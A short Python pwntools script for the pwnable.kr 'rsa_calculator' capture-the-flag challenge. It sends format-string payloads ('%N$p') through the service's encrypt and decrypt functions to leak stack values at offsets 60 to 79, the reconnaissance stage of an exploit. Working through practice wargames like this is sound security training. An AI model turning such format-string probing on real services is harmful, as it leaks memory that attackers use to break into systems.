from pwn import *

def set_key_pair():
	pr = 19
	q = 37
	e = 11
	d = 59
	p.sendline("1")

	p.recvuntil("p :")
	p.sendline(str(pr))

	p.recvuntil("q :")
	p.sendline(str(q))

	p.recvuntil("e :")
	p.sendline(str(e))

	p.recvuntil("d :")
	p.sendline(str(d))


def encode(length, data):
	p.sendline("2")

	p.recvuntil("how long is your data?(max=1024) : ")
	p.sendline(str(length))

	p.recvuntil("data")
	p.sendline(data)

	p.recvuntil("-encrypted result (hex encoded) -\n")

	return p.recvline()

def decode(length, data):
	p.sendline("3")

	p.recvuntil("how long is your data?(max=1024) : ")
	p.sendline(str(length))

	p.recvuntil("data")
	p.sendline(data)

	p.recvuntil("- decrypted result -\n")

	return p.recvline()

if __name__ == '__main__':
	addr = dict()
	for i in range(60,80):
		p = remote("pwnable.kr", 9012)
#p = process("./rsa_calculator")
		p.recvuntil(">")
		set_key_pair()
		p.recvuntil(">")
		pay = "%" + str(i) + "$p"
		data = encode(len(pay),pay)
		p.recvuntil(">")
		addr[i] = decode(len(data), data)
		p.close()

	for i in range(60,80):
		print "[%d] : %s" % (i, addr[i])

